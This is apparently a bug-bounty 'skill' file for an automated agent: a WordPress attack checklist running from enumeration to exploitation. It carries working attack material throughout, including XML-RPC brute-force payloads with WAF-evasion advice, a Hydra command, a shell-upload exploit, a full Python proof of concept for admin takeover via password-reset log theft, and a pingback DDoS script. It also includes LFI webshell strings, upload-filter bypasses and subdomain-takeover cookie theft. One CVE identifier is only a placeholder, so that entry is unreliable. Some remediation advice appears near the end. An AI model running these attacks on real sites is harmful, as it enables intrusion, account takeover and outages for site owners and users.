---
name: "wordpress-assessment"
version: "2.5"
category: "pwn"
subcategory: "wordpress"
phase: "scanning"
tags: ["bug-bounty", "pwn", "wordpress", "cms", "rest-api", "admin-ajax", "xmlrpc", "supply-chain", "ssrf", "lfi", "upload", "graphql", "waf-bypass", "dos", "subdomain-takeover", "misconfiguration"]
tools: ["wpscan", "nuclei", "ffuf", "curl", "hydra", "phpggc", "jq", "dig", "subzy", "subfinder", "dirsearch"]
follow_up_skills: ["exploitation-chaining", "bug-bounty-reporting", "sqli", "xss", "local-file-inclusion", "file-upload-attacks", "server-side-request-forgery", "insecure-deserialization-exploitation", "graphql-vulnerabilities", "denial-of-service-testing", "subdomain-takeover", "waf-bypass"]
description: "Bug bounty skill: wordpress assessment - scanning phase, pwn category"
---
# WordPress Vulnerability Checklist

## Summary

A structured checklist for WordPress security assessment covering enumeration, misconfiguration detection, plugin/theme version checks, brute force, and WordPress-specific CVEs. Goes beyond `wpscan --url`: treats WordPress as a trust-boundary-less application and maps REST, AJAX, XML-RPC, and custom query variables before launching scanners.

## Key Concepts

- **xmlrpc.php**: WordPress RPC endpoint — can be abused for brute force (system.multicall amplification), pingback attacks (SSRF), and DDoS.
- **wp-cron.php**: WordPress cron handler — can be triggered without authentication for potential DoS.
- **REST API User Enumeration**: `/wp/v2/users` exposes registered usernames if not restricted.
- **wp-config.php backup**: Common backup extensions (.bak, .old, .swp) may expose database credentials.
- **Core's silent assumptions**: `wp-content` is writable, `wp-cron.php` is triggerable by anyone, REST API is available for the block editor — every assumption is an attacker hook.
- **Plugin-induced chaos**: Plugins load before the theme, run with full admin capabilities, and can register their own AJAX handlers (`admin-ajax.php`), REST routes, or custom xmlrpc methods — attack surface multiplies per plugin.
- **Theme as application layer**: Modern themes ship page builders, custom post types, and third-party integrations; one mis-designed `functions.php` hook can let an unauthenticated user modify options.
- **Map all endpoints first**: REST, AJAX, XML-RPC, custom query variables — before any scanner.

## Technical Details

### 1. Check /xmlrpc.php

Check availability:
```
POST /xmlrpc.php HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>
```

If accessible, can be used for:
- Brute force (via `wp.getUsersBlogs` or `system.multicall` — one request tests multiple passwords)
- Pingback attacks (SSRF)
- DDoS amplification

**Automated check with Metasploit:**
```
msf6 > use auxiliary/scanner/http/wordpress_pingback_access
msf6 auxiliary(scanner/http/wordpress_pingback_access) > set RHOSTS target.com
msf6 auxiliary(scanner/http/wordpress_pingback_access) > run
```

**SSRF via pingback.ping:**
```
POST /xmlrpc.php HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>http://attacker-controlled-server</string></value>
    </param>
    <param>
      <value><string>http://target.com</string></value>
    </param>
  </params>
</methodCall>
```
Forces the WordPress server to make a request to the attacker's server — confirms SSRF.

**Brute force via system.multicall:**
```
POST /xmlrpc.php HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>admin</string></value>
                        <value><string>test</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
```

### 2. Check /wp-cron.php

```
GET /wp-cron.php
```

If accessible without authentication, can be triggered repeatedly for DoS.

### 3. Username Enumeration

**REST API:**
```
?rest_route=/wp/v2/users
/wp-json/wp/v2/users
/wp-json/wp/v2/users/1
```

**oEmbed endpoint:**
```
/wp-json/oembed/1.0/embed?url=https://target.com&format=xml
```
Returns XML with `author_name` revealing the real username.

**Author archive enumeration:**
```bash
for i in {1..100}; do
  curl -s -L -i http://target.com/?author=$i | \
    grep -E -o "\" title=\"View all posts by [a-zA-Z0-9\-\.]*|Location:.*" | \
    sed 's/\// /g' | cut -f 6 -d ' ' | grep -v "^$"
done
```

**Login form differential response:**
WordPress returns different messages for existing vs non-existing users:
- Invalid username → "Unknown username" / "Invalid username"
- Valid username + wrong password → "The password you entered for the username"

### 4. WordPress Version Detection

Check `/readme.html`, generator meta tag, or:
```bash
curl -s https://target.com | grep -i '<meta name="generator"' | grep -o 'WordPress[^"]*'

# Also check:
# /wp-admin/css/colors.min.css
# /readme.html
# /wp-links-opml.php
```

### 5. Extract Plugins and Themes

**Plugin enumeration:**
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://target.com/ | \
  grep -E 'wp-content/plugins/' | \
  sed -E 's,href=|src=,THIIIIS,g' | \
  awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

**Theme enumeration:**
```bash
curl -s -X GET https://target.com | \
  grep -E 'wp-content/themes' | \
  sed -E 's,href=|src=,THIIIIS,g' | \
  awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

**Version from readme.txt:**
```
/wp-content/plugins/<plugin>/readme.txt
/wp-content/themes/<theme>/readme.txt
```

Plugins to always check: `elementor`, `google-site-kit`, `contact-form-7`, `sitepress-multilingual-cms`, `wordpress-seo`.
Themes to always check: `twentytwentythree`, `astra`, `oceanwp`, `hello-elementor`, `neve`, `storefront`, `enfold`, `avada`, `blocksy`.

### 6. Admin Login Page

Default:
```
/wp-admin
/wp-login.php
/wp-login.php?reauth=1&redirect_to=
/wp-login-secure.php?redirect_to=
```

**Brute force via Hydra:**
```bash
hydra -l <user> -P passwords.txt target.com http-post-form \
  "/?wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" -V
```

### 7. Directory Listing

Check:
```
/wp-content/plugins/
/wp-content/themes/
/wp-content/uploads/
```

### 8. CVE-2018-6389 — WordPress DoS via load-scripts.php

Denial of Service via `/wp-admin/load-scripts.php`. Unauthenticated attackers can exhaust server resources by requesting a large batch of registered `.js` files through the `load` parameter, which queues all specified scripts simultaneously.

**Attack Vector:**
```
GET /wp-admin/load-scripts.php?c=0&load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter HTTP/1.1
```

Sending a request with all registered script handles causes the server to load and serve each file, consuming significant CPU and memory.

**Detection:**
```bash
curl -s -o /dev/null -w "%{http_code}" "https://target.com/wp-admin/load-scripts.php?c=0&load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor"
```

**Mitigation:** Restrict access to `/wp-admin/` with authentication (`.htaccess` or server config). The vulnerability exists in all WordPress versions; it is a design issue of `load-scripts.php` serving concatenated scripts without authentication.

### 9. Contact Form 7 Plugin Vulnerabilities

#### 9a. HyperLink Injection (Auto-Response Emails)

If Contact Form 7 is present, the "Name" and "Cognome"/"Surname" parameters may be reflected in auto-response emails sent by the notification system.

Injection technique:
- Inject a malicious message and URL into the Name/Surname fields.
- The victim receives an email from the client's official (verified/encrypted) notification address — always lands in Inbox.
- Email contains the attacker's message with a malicious link for phishing or malware delivery.

Test: Submit the contact form with `Name` and `Surname` fields containing a test URL and verify it appears in the auto-response email.

#### 9b. CVE-2020-XXXX — Remote File Upload (v5.1.6)

Contact Form 7 5.1.6 allows unauthenticated remote file upload via `modules/file.php`. The file validation can be bypassed, allowing arbitrary file upload to the server.

**Vulnerable flow in `modules/file.php`:**
1. `$_FILES` data is accepted without proper authentication
2. The filename is minimally sanitized via `wpcf7_antiscript_file_name()` and `wpcf7_canonicalize()`
3. `move_uploaded_file()` writes the file to the uploads directory with a predictable path

**Exploit PHP script:**
```php
<?php
$file = "shell.php";
$ch = curl_init("http://target.com/wp-content/plugins/contact-form-7/modules/file.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, array('zip'=>"@$file"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);
print "$result";
?>
```

**Uploaded file location:**
```
http://target.com/wp-content/plugins/contact-form-7/<filename>
```

**Detection:**
```bash
# Test if file.php endpoint exists
curl -s -o /dev/null -w "%{http_code}" "https://target.com/wp-content/plugins/contact-form-7/modules/file.php"

# Check Contact Form 7 version via readme
curl -s "https://target.com/wp-content/plugins/contact-form-7/readme.txt" | grep -i "stable tag"
```

**Mitigation:** Update Contact Form 7 to latest version. Restrict direct access to `modules/file.php`.

### 10. Server-Side DNS Exfiltration (Blind — HubSpot Plugin)

If the HubSpot plugin is used, email fields in contact forms may trigger backend DNS resolution of domain parts during validation.

Test:
```
Email: test@attacker-controlled-domain.oastify.com
```
If the backend performs DNS resolution on the domain, you will observe outbound DNS queries originating from the server — confirming blind SSRF/DNS exfiltration.

### 11. Host Header Injection / Redirection

```
GET / HTTP/1.1
Host: evil.com
```

If the server generates redirects using the `Host` header value, this can lead to open redirect.

### 12. Information Disclosure

Check:
- `/robots.txt` — may expose internal framework paths
- `/wp-includes/` — server type/version information
- Non-existent path — verbose 404 error pages leaking server info
- Generator meta tag — reveals WordPress version
- License.txt (`/license.txt`) — GPL license file shipped by default

### 13. Default Pages

Check for leftover/default WordPress files:
- `/readme.html` — WordPress access paths and version info
- `/wp-admin/upgrade.php` — may expose info or be exploited on vulnerable versions
- `/wp-admin/install.php` — may allow reinstallation if accessible on production
- `/license.txt` — confirms WordPress
- `/wp-mail.php` — receive and publish content via email (may be abused)
- `/wp-admin/setup-config.php` — may reveal internal paths or trigger reinstallation

### 14. Improper Error Handling

Check:
- `/wp-content/debug.log` — may expose internal paths, ports, and sensitive data (automatic download)
- `/wp-json/oembed/1.0/embed?url=https://target.com&format=xml` — application errors
- `/wp-links-opml.php` — version/application errors

### 15. CORS Misconfiguration

```
curl -H "Origin: https://evil.com" -I https://target.com
```

If `Access-Control-Allow-Origin: https://evil.com` is reflected, the target allows cross-origin requests from untrusted origins.

### 16. Banner Grabbing

```bash
curl -I https://target.com/x.php   # PHP version
curl -I https://target.com          # Server (nginx/Apache) version
```

### 17. TLS/SSL Misconfiguration

Check for deprecated protocols (SSLv3, TLS 1.0, TLS 1.1) and weak cipher suites (RC4, 3DES, CBC ciphers vulnerable to BEAST/LUCKY13).

### 18. Missing Security Headers

Audit for missing headers:
- `Strict-Transport-Security`
- `X-Content-Type-Options`
- `X-Frame-Options`
- `X-XSS-Protection`
- `Content-Security-Policy`
- `Referrer-Policy`

### 19. CVE-2025-24000 — Post SMTP Plugin Broken Access Control (Subscriber → Admin Takeover)

Affects the **Post SMTP** plugin (`post-smtp`, 400K+ installs) versions **<= 3.2.0**, fixed in **3.3.0** (published Jun 11 2025). CVSS 8.8 (High), CWE-288 (Auth Bypass / Broken Access Control). Discovered by Denver Jackson, reported via Patchstack in May 2025, public Jul 21 2025.

**Root cause:** REST routes are registered with `permission_callback` = `get_logs_permission`, which simply does `return is_user_logged_in();`. The REST callbacks (`get_details`, etc.) do **no** additional capability checks. Result: ANY authenticated user (even Subscriber) can use admin-only endpoints.

**Vulnerable REST endpoints (namespace `psd/v1`):**
- `GET /wp-json/psd/v1/get-logs` — list email logs (id, subject, ...)
- `GET /wp-json/psd/v1/get-details?id=<log_id>&type=show_view` — full email body in `original_message`
- `GET /wp-json/psd/v1/get-details?id=<log_id>&type=show_transcript` — SMTP session transcript
- Also exposed: email-count stats, resend-email actions

**Attack chain (low-priv account → admin takeover):**
1. Obtain or register any low-privileged account (Subscriber is enough).
2. Trigger a password reset for the target admin: `POST /wp-login.php?action=lostpassword` with `user_login=<admin_email>`.
3. Log in as the low-priv user and scrape a REST nonce from `/wp-admin/` HTML. Nonce is embedded in the `wpApiSettings` JS var (fallback: `postmanVars`) and sent as the `X-WP-Nonce` header.
4. `GET /wp-json/psd/v1/get-logs` → find the log whose subject contains `Password Reset` (or the admin's reset email) → note its `id`.
5. `GET /wp-json/psd/v1/get-details?id=<id>&type=show_view` → read `original_message`, regex-extract the reset link (contains `action=rp&key=...`).
6. Open the reset link → set a new admin password → full site takeover.

**Detection:**
```bash
curl -s 'https://target.com/wp-json/psd/v1/get-logs' \
  -H "X-WP-Nonce: <nonce>" \
  -b 'wordpress_logged_in_...'
```
Only works if the response returns email logs for a Subscriber account. Also enumerate the plugin's REST namespace routes: `GET /wp-json/` and grep `psd/v1`.

**Patch:** 3.3.0 adds a capability check in `get_logs_permission` requiring `manage_options` (Administrator-level) before serving these routes.

**Generalized lesson:** audit any plugin that registers REST routes whose `permission_callback` returns `is_user_logged_in()` without capability checks — treat `is_user_logged_in()` alone as a broken-access-control signal for admin-only functionality.

**Reference PoC (automates the full chain):**
```python
import argparse
import requests
import re
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import urllib3

# Disable SSL warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def extract_nonce_from_html(html):
    # Try wpApiSettings first
    match = re.search(r'wpApiSettings\s*=\s*\{[^}]*"nonce"\s*:\s*"([a-zA-Z0-9]+)"', html, re.DOTALL)
    if match:
        return match.group(1)
    # Fallback to postmanVars
    match = re.search(r'postmanVars\s*=\s*\{[^}]*"nonce"\s*:\s*"([a-zA-Z0-9]+)"', html, re.DOTALL)
    if match:
        return match.group(1)
    return None


def request_password_reset(session, base_url, email):
    session.cookies.set('wordpress_test_cookie', 'WP Cookie check')
    data = {
        'user_login': email,
        'redirect_to': '',
        'wp-submit': 'Get New Password'
    }
    headers = {
        'Referer': urljoin(base_url, '/wp-login.php?action=lostpassword'),
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = session.post(urljoin(base_url, '/wp-login.php?action=lostpassword'), data=data, headers=headers, verify=False)
    if response.status_code != 200:
        raise Exception("Failed to send reset request")
    print("[+] Password reset request sent.")


def login_and_get_cookie_and_nonce(base_url, username, password):
    session = requests.Session()
    session.verify = False
    login_page = session.get(urljoin(base_url, '/wp-login.php'))
    soup = BeautifulSoup(login_page.text, 'html.parser')
    redirect_to = soup.find('input', {'name': 'redirect_to'})
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': redirect_to['value'] if redirect_to else urljoin(base_url, '/wp-admin/'),
        'testcookie': '1'
    }
    session.cookies.set('wordpress_test_cookie', 'WP Cookie check')
    response = session.post(urljoin(base_url, '/wp-login.php'), data=data, allow_redirects=True)
    if 'wp-admin' not in response.url:
        raise Exception("Login failed. Check credentials.")
    admin_page = session.get(urljoin(base_url, '/wp-admin/profile.php'))
    wp_nonce = extract_nonce_from_html(admin_page.text)
    if not wp_nonce:
        raise Exception("Failed to extract X-WP-Nonce")
    return session, wp_nonce


def fetch_logs(session, base_url, nonce):
    headers = {'X-Wp-Nonce': nonce, 'Accept': 'application/json'}
    response = session.get(urljoin(base_url, '/wp-json/psd/v1/get-logs'), headers=headers, verify=False)
    response.raise_for_status()
    logs = response.json().get('logs', [])
    for log in logs:
        if '[researching] Password Reset' in log['subject']:
            return log['id']
    raise Exception("Password reset email not found in logs.")


def fetch_reset_link(session, base_url, log_id, nonce):
    headers = {'X-Wp-Nonce': nonce, 'Accept': 'application/json'}
    response = session.get(
        urljoin(base_url, f'/wp-json/psd/v1/get-details?id={log_id}&type=show_view'),
        headers=headers,
        verify=False
    )
    response.raise_for_status()
    details = response.json().get('details', {})
    message = details.get('original_message', '')
    match = re.search(r'https:\/\/[^\s]+\/wp-login\.php\?[^"\s]+', message)
    return match.group(0) if match else "Reset link not found."


def main():
    parser = argparse.ArgumentParser(description="WordPress reset password automation")
    parser.add_argument('--username', required=True)
    parser.add_argument('--password', required=True)
    parser.add_argument('--url', required=True)
    parser.add_argument('--email', required=True)
    args = parser.parse_args()

    try:
        session = requests.Session()
        session.verify = False

        request_password_reset(session, args.url, args.email)
        session, nonce = login_and_get_cookie_and_nonce(args.url, args.username, args.password)
        log_id = fetch_logs(session, args.url, nonce)
        reset_link = fetch_reset_link(session, args.url, log_id, nonce)
        print(f"[+] Password Reset Link:\n{reset_link}")
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == '__main__':
    main()
```

### 20. Advanced Username Disclosure Bypasses (REST API)

WordPress has progressively locked down `/wp-json/wp/v2/users`, but 2026-era bypasses still leak user lists:

- **`rest_route` parameter** (bypasses pretty permalink rewriting): `/?rest_route=/wp/v2/users`
- **`_embed` technique**: `https://target.com/wp-json/wp/v2/posts?per_page=1&_embed` — response often includes author objects with slugs and email hashes.
- **Headless / decoupled WordPress**: custom endpoints like `https://target.com/wp-json/custom/v1/team` often return full user metadata including emails and roles.
- **Block editor user-search wildcard**: `https://target.com/wp-json/wp/v2/users/?search=*&_fields=id,slug,name,url` — when the user route is public, this wildcard returns the complete user list in one call.
- **`_method` override bypass**: if `/wp/v2/users` returns 401, append `?_method=GET` to any public REST endpoint — many caching layers/reverse proxies convert POST→GET internally and skip the auth check.
- **Simulate block-editor requests**: `curl -s "https://target.com/wp-json/wp/v2/users?per_page=100&_fields=id,slug" -H "X-WP-Nonce: 0"` — a bogus nonce header often returns data for endpoints that only check its presence.

### 21. WAF-Aware Login Bruteforce (XML-RPC Amplification)

Modern sites use WAFs, rate limiting, and JS CAPTCHA. Bypass paths:

**XML-RPC `system.multicall` amplification**: pack up to 2000 `wp.getUsersBlogs` calls in a single `system.multicall` request — multiplies speed and obscures brute force from simple request-rate counters.

```
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param><array><data>
      <value><struct>
        <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
        <member><name>params</name><value><array><data>
          <value>admin</value><value>password1</value>
        </data></array></value></member>
      </struct></value>
      <!-- ... repeat for each password ... -->
    </data></array></param>
  </params>
</methodCall>
```

Send with a legitimate-looking User-Agent and slow randomized delays — many WAFs ignore `system.multicall` because it looks like a single request.

**WPScan with custom throttling and proxy rotation:**

```bash
wpscan --url https://target.com --passwords ./pass.txt \
  --usernames ./users.txt --max-threads 1 --throttle 2000 \
  --random-user-agent --proxy socks5://proxy-pool:1080 --stealthy
```

The `--stealthy` flag avoids tripping login-failure detection systems.

### 22. Exposed Configuration Files — Modern Artifacts

`wp-config.php.bak` is old news. Modern dev workflows leak a new generation of files:

- `.env.local`, `.env.production`, `.env.staging` — API keys and third-party service credentials
- `config/sync.php` — roots/bedrock setups, plain-text DB credentials
- `docker-compose.yml`, `Dockerfile`, `docker.env` — leaked via misconfigured `uploads` folders
- `package.json` / `composer.json` — may hardcode tokens for private repositories
- `sftp-config.json` — accidentally committed by Sublime Text users in theme folders

```bash
ffuf -w modern-configs.txt -u https://target.com/FUZZ \
  -fc 404,403 -e .bak,.old,.save,.swp,.txt,.json,.yml,.yaml,.env,.ini \
  -t 50 -ac
```

Don't just check the webroot — check `/wp-content/themes/<theme-name>/`, `/wp-content/plugins/<plugin>/`, and `/node_modules/` (if exposed).

### 23. Registration Abuse & Default Role Takeover

Exposed `/wp-login.php?action=register` + default role above "Subscriber" = privilege escalation. Membership plugins create roles like "Customer"/"Member" with `upload_files` or `edit_posts` capabilities that can chain into admin via post-editor vulns (e.g., old Elementor template import).

Hunt for hidden role parameters in the registration page source; fuzz:

```
/wp-login.php?action=register&role=administrator
/wp-login.php?action=register&user_role=admin
/wp-login.php?action=register&new_role=editor
```

Sometimes yields immediate privilege escalation if the plugin trusts the parameter.

### 24. Unauthenticated Setup Wizard Takeover

`/wp-admin/setup-config.php?step=1` allows reconnecting the database and rewriting `wp-config.php`. Exploitation flow:

1. Access `https://target.com/wp-admin/setup-config.php?step=1`.
2. Fill in the form to connect to a database you control (or a weakly-secured internal one).
3. Complete installation with your own admin credentials.
4. If the original `wp-config.php` is still on disk, re-run the wizard with the real DB — creating a new admin for the original site.

Multisite variant: `/wp-admin/network/setup.php` accessible can create a new super-admin for the entire network — often forgotten after network creation.

Automated detection (Nuclei-style): check for HTTP 200 containing `<form method="post" action="setup-config.php?step=2">`.

### 25. Weaponizing admin-ajax.php (Hidden Actions)

Every plugin/theme can register hooks for authenticated (`wp_ajax_`) and unauthenticated (`wp_ajax_nopriv_`) admin-ajax actions — passed via `?action=`.

**Finding hidden actions:**
- Dump plugin/theme JS looking for `admin_url('admin-ajax.php')` references.
- Grep plugin source for `add_action( 'wp_ajax_nopriv_'`.
- Fuzz a wordlist of known action names (e.g., `heartbeat`, `wdm_return_ajax`, theme live-search handlers).

**Semi-blind AJAX XSS**: a theme "live search" `wp_ajax_nopriv_theme_search` that doesn't escape the search term allows stored XSS via crafted requests — re-executed from browser history.

**PHP Object Injection via serialized AJAX calls**: many AJAX handlers `unserialize()` user input; craft a POP chain with `phpggc` for RCE:

```bash
phpggc -f exploit_class payload_name | base64 -w0
curl -X POST "https://target.com/wp-admin/admin-ajax.php" \
  -d 'action=my_custom_import&data=O:8:"Exploit":1:{...}'
```

### 26. REST/GraphQL Abuse, oEmbed & Pingback SSRF

**WPGraphQL introspection**: often enabled in production. Dump the full data model and sensitive meta:

```graphql
query {
  users {
    nodes {
      id
      email
      username
      roles
      metaData { key value }
    }
  }
}
```

**Headless login SQLi probe**: custom routes like `/wp-json/myapp/v1/login` may return debug info on error — send `' OR 1=1 --` in the username and watch for SQL errors.

**oEmbed proxy SSRF**: `/wp-json/oembed/1.0/proxy?url=...` is still widely unfiltered:
- AWS metadata: `http://169.254.169.254/latest/meta-data/`
- Internal services on `localhost`, `127.0.0.1`, `[::ffff:127.0.0.1]`
- DNS-rebinding chains against internal Redis/Memcached.

**Pingback SSRF**: `xmlrpc.php` method `pingback.ping` can force requests to internal Kibana/Solr/Jenkins on non-routable IPs — confirm existence via timing/error differences.

### 27. File Inclusion in Plugin/Theme File Parameters

Download/file-view functions with a `file` parameter: sanitize `../` but forget:

- URL-encoded: `%2e%2e%2f`
- Double-encoded: `%252e%252e%252f`
- Overlong UTF-8: `..%c0%af`
- Null byte (older PHP): `file=/etc/passwd%00.png`
- Wrappers: `php://filter/convert.base64-encode/resource=../../wp-config.php`

WordPress-specific fuzz examples:

```
/wp-content/plugins/some-plugin/download.php?file=....//....//....//wp-config.php
/wp-content/themes/some-theme/inc/download.php?file=php://filter/convert.base64-encode/resource=wp-config.php
```

**LFI → RCE escalation paths:**
- **Log poisoning**: inject PHP into User-Agent, include `/var/log/nginx/access.log`.
- **PHP session files**: include session files in `/tmp`.
- **pearcmd trick** (PHP 7/8, if PEAR installed): `+config-create+/<?=eval($_GET[1]);?>+/tmp/evil.php`

### 28. Unrestricted File Uploads — WordPress Blacklist Bypasses

Core uploads are strict, but plugins implement weak handlers. Bypasses:

- Double extensions: `shell.php.jpg`
- MIME spoofing: GIF header + PHP code
- Executable-on-many-servers extensions: `.phtml`, `.phar`, `.shtml`, `.php7`, `.php5`
- `.htaccess` overwrite in `wp-content/uploads/`: add `AddType application/x-httpd-php .gif`, then upload a GIF with PHP code

**Finding upload vectors**: grep AJAX actions containing `upload`, `import`, `import_demo`, `install_plugin`. Theme setup wizards with one-click demo import download a ZIP from a remote server — MitM the download to inject your own plugin.

### 29. DoS: wp-cron Amplification & Pingback DDoS

**wp-cron amplification**: trigger cron hooks that perform expensive operations (e.g., backup plugins doing full DB dumps per request). Discover hooks with `wpscan --enumerate crons` or inspect the `_cron` option (often leaked via SQLi), then POST to `wp-cron.php` with `doing_wp_cron` set to the heavy hook's timestamp — a single request can start a backup, overwhelming CPU/disk I/O.

**XML-RPC pingback DDoS**: use `pingback.ping` to make the target fetch large files from a victim IP; chain multiple WordPress instances for reflective amplification:

```python
import requests
xml = """<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>https://victim.com/large-file</string></value></param>
<param><value><string>https://target.com/?p=1</string></value></param>
</params>
</methodCall>"""
requests.post('https://target.com/xmlrpc.php', data=xml)
```

### 30. Subdomain Takeover (WordPress Staging/CDN)

WP sites use subdomains for staging, CDN origins, or third-party services. If CNAME records point to unclaimed cloud platforms (AWS S3, GitHub Pages, Shopify), register them:

1. Enumerate subdomains via passive DNS (SecurityTrails, VirusTotal) + active brute force.
2. Check for dangling CNAMEs: `dig +short sub.target.com` and verify the service endpoint.
3. For AWS S3 create a bucket with the exact name; for GitHub Pages fork the repo and set the custom domain.
4. Serve a PoC page or JS payload that steals the main site's cookies via lax `document.domain`.

Automate with `subzy` or `subfinder`; nuclei has takeover templates. See `subdomain-takeover` skill for full methodology.

### 31. Modern CVE / Zero-Day Patterns (2024–2026) & Supply-Chain Auditing

Current trends to hunt for:

- **Authenticated RCE via Gutenberg block attributes**: malformed block data in post meta triggers object injection when the block editor processes it.
- **SQLi in `WP_Query` `meta_query`**: crafted parameters bypass `prepare()` when plugins pass unsanitized input.
- **Plugin supply-chain attacks**: attackers compromise plugin repos and backdoor updates. Audit update mechanisms — look for `add_filter('pre_set_site_transient_update_plugins', ...)` pulling from a malicious server.
- **Second-order SSTI in email templates**: admin-customizable email templates rendered by Twig/Blade without escaping → server-side template injection.
- **Deserialization**: audit every plugin calling `maybe_unserialize()` on user input — still the #1 RCE vector.

**Actionable research workflow:**
- Monitor the WordPress Plugin Directory for suspiciously updated plugins with new maintainers.
- Set up a local install and diff plugin updates for new `eval()`, `system()`, or `base64_decode()` calls.

### 32. Tooling & Automation for Modern Hunting

**WPScan:**
```bash
wpscan --url https://target.com --plugins-detection mixed --plugins-version-detection mixed
# pair with a custom wordlist of rare plugins + changelog DB to find outdated, not-yet-disclosed versions
```

**FFUF / dirsearch WordPress-specific wordlists:**
- Paths from premium themes/plugins (Avada, Divi, Elementor Pro)
- Multisite-only paths: `/wp-content/blogs.dir/`, `/wp-includes/ms-*.php`
- Managed-host backup patterns (Kinsta, WP Engine)

**Custom Nuclei templates** (beyond public templates):
- Exposed `debug.log` / error logs with stack traces
- PHP info disclosure (`phpinfo.php`, `info.php`, `test.php`)
- Specific vulnerable plugin versions by `readme.txt` hash

```yaml
id: wp-debug-log-exposed
info:
  name: WordPress debug.log
  severity: medium
requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/debug.log"
    matchers:
      - type: word
        words:
          - "PHP Fatal error"
          - "Stack trace"
        condition: or
```

**Burp Suite extensions**: WP-Scan (adds WP-specific headers, fuzzes common endpoints), Active Scan++ (reflected params in WP-admin XSS context).

### 33. Report-Ready Mitigations (Remediation Advice)

- Disable unused REST routes: `add_filter( 'rest_endpoints', function( $endpoints ) { ... } );`
- Harden `wp-cron`: use real system cron and `define('DISABLE_WP_CRON', true)` + an `.htaccess` rule.
- Block XML-RPC entirely unless needed; if needed, whitelist only `wp.getUsersBlogs` (Jetpack).
- Implement CSP restricting `script-src`/`style-src` — neutralizes stored XSS.
- Automated integrity monitoring (Tripwire/custom scripts) on `wp-config.php`, `index.php`, `.htaccess`.
- Enforce strong passwords + 2FA; use Application Passwords for API access instead of user credentials.

## Methodology

1. Run `wpscan --api-token <TOKEN> --url https://target.com` for automated enumeration.
2. Run nuclei with WordPress templates.
3. Run ffuf to fuzz wp-content paths:
   ```
   ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/wordpress.txt
   ```
4. Check WordPress version and match against known CVEs.
5. Extract plugin list and check each version against vulnerability databases (wpvulndb, CVEdetails).
6. Check admin login page for brute force protection.
7. Test for directory listing on wp-content subdirectories.
8. Test xmlrpc.php for brute force (system.multicall), pingback SSRF, and DDoS.
